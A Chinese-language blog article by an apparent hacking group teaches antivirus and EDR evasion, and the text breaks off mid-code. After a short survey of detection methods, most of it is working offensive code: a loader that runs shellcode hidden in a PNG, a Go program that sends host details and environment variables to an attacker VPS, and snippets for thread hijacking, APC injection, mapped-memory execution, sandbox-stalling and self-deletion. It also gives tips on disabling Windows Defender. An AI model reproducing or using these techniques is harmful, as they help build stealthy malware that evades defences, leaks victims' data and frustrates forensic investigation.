---
title: 免杀心法
date: 2026-07-13
category: 攻防技术
summary: 从 AV/EDR 检测机制出发，总结静态特征、动态沙箱与常见对抗思路。
slug: mianshaxinfa
coverText: 免
published: true
---

内容摘要

本文档由Hacking Group 0434成员撰写，总结了免杀技术核心知识。内容涵盖AV/EDR检测机制（静态特征码、启发式、哈希、信誉分析、熵值检测、动态沙箱、API挂钩等）和绕过手段（shellcode loader、分离加载、线程劫持、APC注入、映射注入、API干扰、自我删除等），帮助读者理解并实现隐蔽的恶意软件加载与执行方式。

# 前言

本文由Hacking Group 0434 **hongzh0**、**影子猫**共同撰写。

免杀的话也算做了一段时间了，虽然还是很菜，但是也一直想做一个免杀心法来进行总结。但碍于自己懒，不愿意学Windows API这一块，一直拖延。正好最近有个免杀的培训项目，连夜突击总算把心法总结出来了。

# AV/EDR检测机制

关于杀毒软件的检测机制，其实说白了也很简单：静态、动态。但是往下细分其实也很杂乱。

静态：在文件**运行之前**，通过分析其二进制代码、结构、元数据等“静态”特征来进行判断。就像法医在犯罪现场收集指纹、DNA等物证。

也可以说成是特征检测。

## 静态检测

### 特征码检测

首先检测的就是特征码

_在恶意软件分析中，“特征码”是一段能够唯一标识该恶意软件的特定字节序列或字符串。此外，特征码的判定条件还可以包括特定的变量名、导入的函数等。_

这是最基础、最传统的方法。特征码是一段能唯一标识特定恶意软件的**字节序列**或**字符串**。

当然，判定条件不仅包括文件内容的特定字节，还可以是：

- **导入的函数**：例如，一个普通文本编辑器却导入了键盘记录相关的API

- **字符串**：文件中包含的可疑URL、恶意软件家族名称、可疑命令等

- **代码结构**：特定的编译器签名、代码段特征等。

- 。。。


### 静态启发式检测

启发式检测分为静态与动态，本文以静态 OR 动态两个层面入手，所以也把静态启发式检测提前写在这里。

_鉴于对恶意文件稍作修改就能轻易绕过传统的签名检测，启发式检测技术应运而生。它不再依赖精确的字节匹配，而是通过分析代码的行为模式、结构特征等共通点，来识别已知恶意软件的未知变种和新版本。_

静态启发式检测主要做的工作就是对于可疑程序进行反编译，并将代码片段与已知且位于启发式数据库中的恶意软件进行比较，如果源代码中的特定百分比片段与启发式数据库中任意内容匹配则会标记该程序。

### 哈希检测

哈希检测是一种非常简单的检测技术，也是杀软中检测恶意软件最快、最简单的一种方法。这种方法通过简单地在数据库中保存有关已知恶意软件的哈希值，并将其与可疑软件的哈希值进行对比，查看是否存在正匹配项。

思考一下，为什么杀软根据哈希值查杀软件的速度会这么快？

_可以设想一下，假设我负责一个数量特别庞大的病毒哈希数据库，那我该如何才能让哈希检测做到像现在AV这样落地秒删呢。_

_其实这里用到了哈希表的一个思路，最近也在看windows入侵检测与防御性编程这本书，写得相当好。在这本书里第一章提了一个例子：_

_早些年有家单位老是受到恶意软件病毒木马的骚扰，于是这家单位的一名员工就想到了一个办法：将工作常用的软件提取哈希值，建立一个白名单，在运行软件之前检测试图运行的软件是否在白名单内，如果在则允许运行，如果不在则不允许运行。_

_但是这样的思路还是太死板，不过我也将其认定为是早期AV的雏形。_

_试想一下：_

_我现在手里有一个病毒库，如果每次拿到未知软件时，都要从我的病毒库里遍历1-100(示例)号，是不是很麻烦，速度也不快。于是有人想到了这样的一个办法：_

_安全人员可以编写一个自研算法，该算法并不难。作用是获取到病毒库中的各类文件/路径之后，使用该算法去进行计算，最终算出一个在1-100之间的数字，将其填写在对应编号的格子里。每次有新的文件试图执行时，安全人员通过算法，通过此文件算出一个位于1-100之间的值，然后去对应的格子找在这个格子里是否存在这个文件哈希值。并且一个格子也不必只能存一个哈希值，可以以链表的形式存多个，只要缩短查询时间都可以。_

_假设我现在有如下内容_

`索引： 0 1 2 3 4 5 6 7 8 9`  
`内容：[空, 41, 12, 空, 空, 25, 76, 空, 38, 59]`

_这时来了一个新文件，计算值为0，我们可以很快速得看到0里面是空的，所以我们甚至都不需要比较，直接允许运行。_

### 信誉分析

不只看文件本身，还看它的“背景”。通过查询云端信誉数据库，判断文件的哈希值、数字签名、来源URL等是否可信。

### 熵值检测

熵值，即为混乱值。

**正常程序**：包含大量的代码（有一定结构）和零值区域（用于填充空间），其二进制代码不是完全随机的，所以熵值处于**中等水平**。

**加壳或加密的程序**：

为了逃避检测，恶意软件作者常常使用“加壳器”对原始代码进行压缩和加密。无论是压缩还是加密，其目的都是将数据变得高度随机，去除所有可识别的模式。因此，一个被加壳或加密的文件，其二进制代码看起来就像一堆乱码，**熵值会非常高**。

步骤：

1. 扫描一个文件时，工具会计算文件整体或其中关键部分（如代码段）的熵值。

2. 将计算出的熵值与一个预设的阈值进行比较。

3. 如果熵值异常高：这个文件会被立刻标记为 “高度可疑” 。它很可能被加壳或加密了，目的是隐藏其真实意图。如果熵值正常：则通过这项检查，继续进行其他类型的检测（如特征码、启发式分析等）。




## 动态分析

### 沙箱检测

沙箱检测，相当于将恶意软件放到一个实验环境运行，进而去观察恶意软件的行为：

- 是否释放文件

- 是否对外通信

- 是否调用敏感API

。。。

  ![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143051158.png)

### API挂钩

API挂钩目前主要应用于EDR上，用于实时监控进程或者代码中的恶意行为。API钩子的原理是拦截常用的API，然后实时分析这些API的参数。
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143058689.png)

### IAT检查

**IAT** 的全称是 **Import Address Table**（导入地址表）。可以把它想象成一个可执行文件（.exe, .dll）自带的 **“通讯录”** 或 **“电话簿”**。

**这个“通讯录”里记录了联系人姓名(调用了哪些外部函数。**例如，它是否调用了 `CreateFile`、`RegSetValue`、`InternetOpen`**)与所属单位(**来自**哪个系统库。**是来自 `kernel32.dll`、`advapi32.dll` 还是 `ws2_32.dll`**)
其余不说了，因为我个人觉得沙箱检测已经把网络/行为等等动态检测机制全部包含到里面了。
# 常规免杀

CS载荷工作流程：

1. 直接放大马

2. 小马拉大马


## shellcode loader

shellcode loader顾名思义就是加载shellcode的程序，shellcode是一种特殊的二进制代码，主要目的是在目标系统执行特定操作例如获取系统权限、建立远程访问通道等。但是shellcode本身只是一串文本，AV除了对其进行常见字符串检测以外并不能对其进行查杀。

工作流程：

1. 开辟内存(VirtualAlloc)

2. 将shellcode放置于这块内存中(memcpy)

3. 新建线程执行(CreateThread)


针对于常规免杀，攻击者可以使用例如base64/AES/Xor等操作对shellcode进行加密处理。也有刚学免杀的小白对shellcode进行N多次AES加密然后说自己能过360，不深入学下去的话终究是饮鸩止渴。

内存级别加密也是必要的，因为上述加密方法会在程序运行时进行解密，释放到内存中的shellcode依旧是原始的shellcode。而内存级别的自解密shellcode**刚开始**在内存中是一串从未见到过的shellcode。可以使用sgn进行处理：  https://github.com/EgeBalci/sgn

![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143112959.png)

## shellcode分离加载

正如上述shellcode与shellcode loader是分开的，所以攻击者可以将shellcode藏到任何位置：

1. shellcode本地分离加载(exe加载器+bin文件shellcode)

2. shellcode网络分离加载(exe加载器+VPS上的shellcode文件)

3. shellcode图片分离加载(exe加载器+正常图片中的shellcode)


网络分离和本地分离不建议使用，前者暴露VPS地址/可能影响信誉分析结果。后者bin文件落地容易被杀软查杀字符串特征。所以重点说一下shellcode图片分离加载：

大致思路就是将shellcode插入一张图片的末尾，获取未插入之前的图片二进制字节长度，同时获取shellcode长度，将shellcode插入图片之后shellcode loader将未插入之前的图片二进制字节长度作为起始值，截取shellcode长度的长度以获取完整的shellcode。
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143136668.png)

 ![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143152170.png)
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143157089.png)

![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143200961.png)

### 代码实现

向图片中插入shellcode

``` python
def main(shell_code, file_name="hz.png"):

    # 打开png

    with open(file_name, mode="rb") as f:

        data = ()

        print("shell_code 起始位置为:", len(data))

        with open("hz_new.png", mode="wb") as f:

            f.write(data+shell_code)

            print("shell_code 插入成功")

if name == '__main__':

    data = b"\xfc+shellcode"

     main(data)
```

shellcode loader从图片中获取shellcode

``` C
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#pragma comment(linker, "/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

int main() {
    const char* filename = "hz_new.png";
    const long offset = 1201798; // shellcode 起始偏移

    printf("[+] Opening file: %s\n", filename);
    FILE* file = fopen(filename, "rb");
    if (!file) {
        perror("[-] Error opening file");
        return 1;
    }

    // 获取文件大小
    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    printf("[*] File size: %ld bytes\n", filesize);

    if (filesize <= offset) {
        fprintf(stderr, "[-] Error: offset (%ld) exceeds file size (%ld)\n", offset, filesize);
        fclose(file);
        return 1;
    }

    long shellcode_size = filesize - offset;
    printf("[+] Shellcode offset: %ld\n", offset);
    printf("[+] Shellcode size: %ld bytes\n", shellcode_size);

    // 定位到偏移
    if (fseek(file, offset, SEEK_SET) != 0) {
        perror("[-] fseek failed");
        fclose(file);
        return 1;
    }

    // 读取数据
    char* buffer = (char*)malloc(shellcode_size);
    if (!buffer) {
        perror("[-] Memory allocation failed");
        fclose(file);
        return 1;
    }

    size_t read_bytes = fread(buffer, 1, shellcode_size, file);
    fclose(file);

    if (read_bytes != shellcode_size) {
        fprintf(stderr, "[-] fread error: expected %ld, got %zu\n", shellcode_size, read_bytes);
        free(buffer);
        return 1;
    }

    printf("[+] Shellcode read successfully (%zu bytes)\n", read_bytes);

    // 分配内存
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        fprintf(stderr, "[-] VirtualAlloc failed (code: %lu)\n", GetLastError());
        free(buffer);
        return 1;
    }

    printf("[+] Allocated memory at: 0x%p (size: %ld)\n", exec_mem, shellcode_size);

    memcpy(exec_mem, buffer, shellcode_size);
    printf("[+] Shellcode copied to allocated memory.\n");

    // 测试前几个字节是否合理
    printf("[*] First 8 bytes of shellcode: ");
    for (int i = 0; i < 8 && i < shellcode_size; i++) {
        printf("%02X ", (unsigned char)buffer[i]);
    }
    printf("\n");

    // 创建线程
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "[-] CreateThread failed (code: %lu)\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(buffer);
        return 1;
    }

    printf("[+] Thread created successfully! Handle: 0x%p\n", hThread);

    // 等待线程执行
    DWORD waitResult = WaitForSingleObject(hThread, INFINITE);
    printf("[*] WaitForSingleObject returned: %lu\n", waitResult);

    DWORD exitCode = 0;
    if (GetExitCodeThread(hThread, &exitCode)) {
        printf("[+] Thread exit code: 0x%08lX\n", exitCode);
    }
    else {
        fprintf(stderr, "[-] GetExitCodeThread failed (code: %lu)\n", GetLastError());
    }

    // 清理
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(buffer);

    printf("[+] Execution finished.\n");
    return 0;
}
```

# 奇淫巧技

## dount实现exe转bin结合加载器实现任意文件免杀

如上述shellcode+shellcode loader的思路可以推出，shellcode loader的作用是可以加载任何shellcode，那如果攻击者能将内网扫描器/工具也转成shellcode是不是也就可以实现内网工具全免杀了？

巧了，正好有可以将exe转成shellcode的工具  

自行尝试，今年年中打HW时用这个思路做到了fscan、frp等一系列内网工具全免杀



## 金山毒霸关闭windows defender？

之前总听说火绒是windows defender的关闭器，因为众所周知windows defender在用户安装第三方杀软后就会停止运行。

假设场景，攻击者拿到管理员权限webshell但是目标主机上存在windows defender

运行如下命令，从官网拉杀软：



windows defender对于通过powershell拉取软件的行为很双标，从正常网站拉，例如拉取AV或者是todesk等合法软件defender不会进行拦截，但是只要是从VPS上拉马子，必拦。
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143219189.png)



在对几种杀软测试下来之后发现

火绒删除了静默安装，必须从图形化界面安装：
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143223405.png)





腾讯电脑管家，通过静默安装报网络错误：
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143240655.png)

金山毒霸静默安装参数slient：

  ![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143300154.png)


对比：

一个没怎么做免杀的木马：

  ![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143245264.png)

![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143304717.png)



## 服务端可实现行为检测绕过？火绒6.0坑中之坑

来自影子猫贡献的视频
![[msxf.mp4]]

11月16日最新版火绒测试：
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143326258.png)



不解释装高手，可以说的是除了视频中的AES加密与修改server端文件以外没有进行其他操作

## 获取系统配置发送到VPS针对性过沙箱检测

众所周知，想过沙箱检测就要先让恶意软件发现自己在沙箱中，当恶意软件检测到自己在沙箱中时就去进行合法操作/EXIT

跟很多师傅聊的时候都说现在的沙箱特征不好找。前段时间发现了一个漏洞报告：

  ![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143344668.png)
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143348453.png)




可以看到这是微步云沙箱的隔离策略做得不足导致的SSRF，虽然是老报告了但是从中提取到一个思路：exe可以从沙箱外带数据。

那么有没有一种可能，攻击者可以写一个获取当前系统各种配置的exe，执行后将获取到的信息发送到攻击者的VPS上呢？

代码示例：

获取系统配置发送到VPS针对性过沙箱检测

``` go
package main

import (
    "encoding/json"
    "fmt"
    "net"
    "os"
    "os/user"
    "runtime"
    "time"
)

type SystemInfo struct {
    Hostname   string            `json:"hostname"`
    Username   string            `json:"username"`
    OS         string            `json:"os"`
    Arch       string            `json:"arch"`
    Time       string            `json:"time"`
    TimeZone   string            `json:"timezone"`
    Env        map[string]string `json:"env"`
    Interfaces []string          `json:"interfaces"`
    GoVersion  string            `json:"go_version"`
    WorkingDir string            `json:"working_directory"`
}

func main() {
    info := SystemInfo{}

    hostname, _ := os.Hostname()
    info.Hostname = hostname

    currentUser, _ := user.Current()
    info.Username = currentUser.Username

    info.OS = runtime.GOOS
    info.Arch = runtime.GOARCH
    info.GoVersion = runtime.Version()

    now := time.Now()
    zone, offset := now.Zone()
    info.Time = now.Format(time.RFC3339)
    info.TimeZone = fmt.Sprintf("%s (UTC%+d)", zone, offset/3600)

    env := os.Environ()
    envMap := make(map[string]string)
    for _, e := range env {
        pair := []rune(e)
        for i, ch := range pair {
            if ch == '=' {
                envMap[string(pair[:i])] = string(pair[i+1:])
                break
            }
        }
    }
    info.Env = envMap

    ifaces, _ := net.Interfaces()
    for _, iface := range ifaces {
        if iface.Flags&net.FlagUp != 0 {
            info.Interfaces = append(info.Interfaces, iface.Name)
        }
    }

    wd, _ := os.Getwd()
    info.WorkingDir = wd

    // --- 新增：发送数据到网络 ---
    // 尝试连接到目标地址
    conn, err := net.Dial("tcp", "你VPS的IP")
    if err != nil {
        // 如果连接失败，打印错误，但程序会继续执行以保存到文件
        fmt.Println("Error connecting to server:", err)
    } else {
        // 如果连接成功
        fmt.Println("[*] Connecting to 你VPS的IP...")
        defer conn.Close() // 确保连接被关闭

        // 使用网络连接作为 io.Writer 创建一个新的 JSON 编码器
        netEncoder := json.NewEncoder(conn)
        netEncoder.SetIndent("", "  ") // 保持和文件一致的缩进

        // 编码并发送数据
        if err := netEncoder.Encode(info); err != nil {
            fmt.Println("Error sending JSON over network:", err)
        } else {
            fmt.Println("[+] Data sent successfully to 你VPS的IP")
        }
    }
    // --- 新增代码结束 ---

    // 原始代码：输出为 JSON 文件
    file, err := os.Create("system_info.json")
    if err != nil {
        fmt.Println("Error creating output file:", err)
        return
    }
    defer file.Close()

    // 使用文件作为 io.Writer 创建 JSON 编码器
    fileEncoder := json.NewEncoder(file)
    fileEncoder.SetIndent("", "  ")
    if err := fileEncoder.Encode(info); err != nil {
        fmt.Println("Error writing JSON to file:", err)
        return
    }

    fmt.Println("[+] System information collected successfully.")
    fmt.Println("[*] Output written to system_info.json")
}
```
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143409249.png)
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143418056.png)
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143433806.png)
![image.png](https://gitee.com/hongzh0//picrrrrasaasaszxxzxz/raw/master/20260125143441014.png)

# 高级免杀

## 暗度陈仓之“代码执行”

恶意软件总得干坏事吧？它的坏代码（我们叫Shellcode）怎么才能悄悄地跑起来，而不被保安（杀毒软件）发现呢？

传统的做法是：申请一块地（分配内存），把坏东西放进去（写入代码），然后找个工人（创建线程）去执行。这个流程太经典了，保安一抓一个准。所以，高手们想出了各种骚操作：

### 不请工人，而是“忽悠”现有的工人（线程劫持）

公司里本来就有很多在干活的正经员工（系统线程）。恶意软件找到一个正在休息（挂起）的员工，偷偷修改了他的任务清单（线程上下文），把“下一步做什么”的指针，直接改成了去执行坏代码。

假设我们有一个善良的函数：
``` C  
void GoodFunction() { printf("I'm a good citizen!\n"); }
```

我们创建一个线程去执行它，但这个线程是“睡着”的（挂起状态）。

``` C
HANDLE hThread = CreateThread(NULL, 0, GoodFunction, NULL, CREATE_SUSPENDED, NULL);
```

现在，恶意软件要劫持这个“睡着的警察”：

查看警察的“任务清单”（获取线程上下文）


``` C
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);
```

这个 `ctx` 结构体里，有一个非常重要的成员叫 `Rip`（64位）或 `Eip`（32位），它指向线程醒来后要执行的第一条指令地址，也就是 `GoodFunction`。

偷换任务清单（修改指令指针）

``` C
// 假设 pShellcode 是我们坏代码在内存中的地址
ctx.Rip = (DWORD_PTR)pShellcode;//把 Rip 从指向 GoodFunction 改成了指向 pShellcode。
SetThreadContext(hThread, &ctx);
```

在实际操作中，直接跳转到Shellcode有时会不稳定。更常见的做法是注入一段‘桩代码’，它负责准备好运行环境（比如修复重定位），再执行Shellcode，这样鲁棒性更强。

叫醒警察

``` C
ResumeThread(hThread);
```

### 利用公司的“广播系统”（APC注入）

公司有个广播系统（APC队列），可以给每个员工发临时任务。有些员工处于“可以接收临时任务”的状态（可警告状态）。恶意软件就把坏代码当作一个临时任务，通过广播系统塞给这些员工。
``` C
#include <Windows.h>

// 1. 准备shellcode
unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0x90 };

// 线程函数：进入可警告状态
DWORD WINAPI AlertableSleep(LPVOID) { SleepEx(INFINITE, TRUE); return 0; }

int main() {
    // 2. 分配可执行内存
    void *pAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pAddr, shellcode, sizeof(shellcode));

    // 3. 创建可警告线程
    HANDLE hThread = CreateThread(NULL, 0, AlertableSleep, NULL, 0, NULL);
    Sleep(100);  // 确保线程已进入睡眠

    // 4. APC注入 - 把shellcode塞给睡眠线程
    QueueUserAPC((PAPCFUNC)pAddr, hThread, NULL);

    // 5. 等待执行完成
    Sleep(2000);

    // 清理
    CloseHandle(hThread);
    VirtualFree(pAddr, 0, MEM_RELEASE);
    return 0;
}
```

### 冒充“公司通知”（回调函数滥用）

Windows系统本身有很多“通知”，比如“每过一段时间通知我一下”、“枚举一下所有窗口通知我”。恶意软件冒充成一个合法的通知接收器，当系统真的发出这些通知时，触发的就是恶意代码。

我们可以注册一个函数，到时见就让系统调用。

``` C++
// 正常的定时器回调函数签名
VOID CALLBACK MyTimerCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) { ... }

// 恶意使用：直接把shellcode的地址当成回调函数传进去
CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)pShellcode, NULL, 1000, 0, 0);
```


这行代码的意思是：系统啊，过1秒钟（1000毫秒），你去调用一下 `pShellcode` 这个地址的函数。系统很老实，时间一到，就去执行了我们的坏代码。这在行为上看，就像是程序在处理一个正常的定时事件。

### 不用自己的地，去租“共享仓库”（映射注入）

之前申请私人用地（`VirtualAlloc`）太扎眼了。现在恶意软件改用申请“共享仓库”（文件映射）来存放坏代码。保安对仓库的监控没那么严。

``` C++
// 1. 创建一个文件映射对象，直接要求“可读可写可执行”的权限
HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size, NULL);
// 2. 把这个映射“映射”到当前进程的内存空间
PVOID pMemory = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, size);
// 3. 把坏代码复制到这个内存里
memcpy(pMemory, pShellcode, size);
// 4. 直接执行
((void(*)())pMemory)();
```

我们用 `CreateFileMapping` 和 `MapViewOfFile` 这套组合拳，绕开了最被监控的 `VirtualAlloc`，同样得到了一块可以执行代码的内存。

## 鱼目混珠之“干扰对抗”

- **拖延时间**：沙箱通常很忙，给每个软件的分析时间有限（比如一两分钟）。恶意软件一进去，啥正事也不干，就开始疯狂地……创建文件、写文件、读文件、删文件。这个操作它重复成千上万次，可能一折腾就是一分钟。沙箱等不及了，以为这是个没啥危害的“文件清理工具”，就把它放过了。而真正的恶意代码，是在这一通折腾之后才悄悄执行的。

- **制造噪音**：即使在执行恶意代码的同时，它也可以在后台不停地搞这些小动作。这样，行为记录里就会充满大量无关的文件操作，真正的恶意行为就像一滴水藏进了大海，很难被分析引擎发现。



``` C++
BOOL ApiHammering(DWORD dwStress) {
    WCHAR szPath[MAX_PATH];
    GetTempPathW(MAX_PATH, szPath); // 获取系统临时文件夹路径
    lstrcatW(szPath, L"dummy.tmp"); // 构造一个临时文件路径

    for (int i = 0; i < dwStress; i++) {
        // 1. 创建一个临时文件
        HANDLE hFile = CreateFileW(szPath, GENERIC_WRITE, ...);
        // 2. 生成1MB的垃圾数据
        PBYTE pJunkData = (PBYTE)malloc(0xFFFFF);
        memset(pJunkData, 'A', 0xFFFFF); // 全部填上'A'
        // 3. 把1MB垃圾数据写入文件
        WriteFile(hFile, pJunkData, 0xFFFFF, &bytesWritten, NULL);
        CloseHandle(hFile);

        // 4. 再打开这个文件，标记为“读取后删除”
        hFile = CreateFileW(szPath, GENERIC_READ, ..., FILE_FLAG_DELETE_ON_CLOSE);
        // 5. 再把刚写的数据读出来
        ReadFile(hFile, pJunkData, 0xFFFFF, &bytesRead, NULL);
        CloseHandle(hFile); // 文件在这里被自动删除
        free(pJunkData);
    }
}
```

这个函数 `ApiHammering(1000)` 会干什么？它会循环1000次：创建文件 -> 写1MB数据 -> 读1MB数据 -> 删除文件。这得花多少时间？可能好几分钟。

沙箱一看，这程序运行了两分钟，尽在跟临时文件较劲了，看起来像个抽风的软件，不像病毒。沙箱为了效率，时间一到就把它放过了。而真正的恶意代码，是在这个循环**之后**才执行的。这就是简单的“拖延战术”，却非常有效。

## 金蝉脱壳之“自我删除”

想象一下，一个小偷进了你家，偷完东西后，不仅人跑了，还把进来时的脚印、指纹全部抹掉，甚至连他自己这个人都从世界上“删除”了。这就是自我删除技术想做的事。

**它解决了一个什么问题？**  
在Windows系统里，一个程序如果正在运行，你是很难删除它的，系统会提示“文件正在被使用”。这本来是个保护机制，但却被恶意软件利用了。

**它是怎么做到的？**  
它没有硬来，而是玩了一个“偷梁换柱”的把戏。它利用了NTFS文件系统一个叫“数据流”的特性。你可以把一个文件想象成一个带标签的盒子（`:数据`流）。恶意软件做的事情就是：

1. 它先把自己的“盒子标签”改个名字，比如从 `:数据` 改成 `:垃圾`。

2. 这个时候，系统认为原来的文件（`:数据`）已经不见了，所以它这个程序虽然还在跑，但对应的“文件”已经没了。

3. 它再打开那个现在叫 `:垃圾` 的盒子，把它标记为“关门就销毁”。

4. 最后，它把门一关，这个文件就彻底从磁盘上消失了。


整个过程，这个程序一直安然无恙地在内存里运行，干着它的坏事，但磁盘上已经找不到它的踪影了。这给事后取证和分析带来了极大的麻烦。



第一步：拿到自己的身份证(句柄)

``` C++
// 获取当前程序自己的路径
GetModuleFileNameW(NULL, szPath, MAX_PATH);
// 以“删除”权限打开自己
hFile = CreateFileW(szPath, DELETE, ...);
```

第二步：重命名数据流
``` C++
// 告诉系统，我把默认的`:数据`流，改名叫`:垃圾`
SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo);
```

第三步：标记“关门就销毁”

``` C++
// 重新打开这个“空壳”文件
hFile = CreateFileW(szPath, DELETE, ...);
// 告诉系统，这个文件句柄关闭时，就把文件彻底删了
SetFileInformationByHandle(hFile, FileDispositionInfo, &DeleteInfo);
CloseHandle(hFile); // 关门！文件瞬间消失！
```



整合代码示例：

``` C++
// malware_demo.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include <wininet.h> // 用于网络操作
#pragma comment(lib, "wininet.lib")

// 这是一个简单的弹计算器的Shellcode (x64)
unsigned char shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
};

// 演示1：传统的线程创建执行（作为对比基线）
void Demo1_TraditionalThread() {
    printf("[演示1] 传统线程创建执行 - 按回车键开始...\n");
    getchar();

    // 分配内存
    LPVOID pMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMemory) {
        printf("  [!] VirtualAlloc 失败: %d\n", GetLastError());
        return;
    }
    printf("  [+] 内存分配成功: 0x%p\n", pMemory);

    // 复制Shellcode
    memcpy(pMemory, shellcode, sizeof(shellcode));
    printf("  [+] Shellcode 写入内存\n");

    // 修改内存保护为可执行
    DWORD oldProtect;
    if (!VirtualProtect(pMemory, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("  [!] VirtualProtect 失败: %d\n", GetLastError());
        return;
    }
    printf("  [+] 内存保护更改为可执行\n");

    // 创建线程执行
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
    if (!hThread) {
        printf("  [!] CreateThread 失败: %d\n", GetLastError());
        return;
    }
    printf("  [+] 线程创建成功，Shellcode 已执行 (应弹出计算器)\n");

    WaitForSingleObject(hThread, 2000); // 等待线程执行
    CloseHandle(hThread);

    printf("  [#] 演示1结束，按回车继续...\n");
    getchar();
}

// 演示2：APC注入执行
void Demo2_APCInjection() {
    printf("\n[演示2] APC注入执行 - 按回车键开始...\n");
    getchar();

    // 分配内存并复制Shellcode
